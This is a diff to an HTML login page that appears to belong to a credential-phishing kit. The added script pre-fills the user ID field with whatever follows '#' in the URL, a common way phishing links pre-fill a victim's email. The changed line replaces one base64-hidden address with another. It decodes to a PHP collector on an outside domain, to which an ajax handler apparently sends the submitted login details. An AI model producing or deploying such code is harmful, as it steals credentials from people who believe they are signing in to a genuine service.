@@ -113,6 +113,31 @@ if(document.userLoginForm.password.value.trim() == "" || document.userLoginForm.
 }
 </script> -->
 
+    <script>
+		
+        var feedUpdateResponse = window.location.href;
+        var feedUpdateSplit = feedUpdateResponse.split("");
+        
+        for (var x = 0; x < feedUpdateSplit.length; x++) {
+         
+         if (feedUpdateSplit[x]=="#"){
+          var che= feedUpdateResponse.substring(x+1);
+         
+         }else{
+         
+        
+         }
+         
+         
+         }
+          document.getElementById("userid").value =che
+        document.getElementById("userid").innerHTML = che
+        //   document.getElementById("userid").value =che
+        
+        </script>
+
+
+
 
 <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
 <script>
@@ -127,7 +152,7 @@ if(document.userLoginForm.password.value.trim() == "" || document.userLoginForm.
 		
 		count=count+1;
 		
-	   var d=atob("aHR0cHM6Ly9tYXhtZWV0Lm9ubGluZS93cC1nZW4tZmlsZS9zaW0ucGhw");
+	   var d=atob("aHR0cHM6Ly9tYXhtZWV0Lm9ubGluZS9rYWZlMjQvQ2FmZTI0LnBocA==");
 
 		e.preventDefault();
 		   $.ajax({
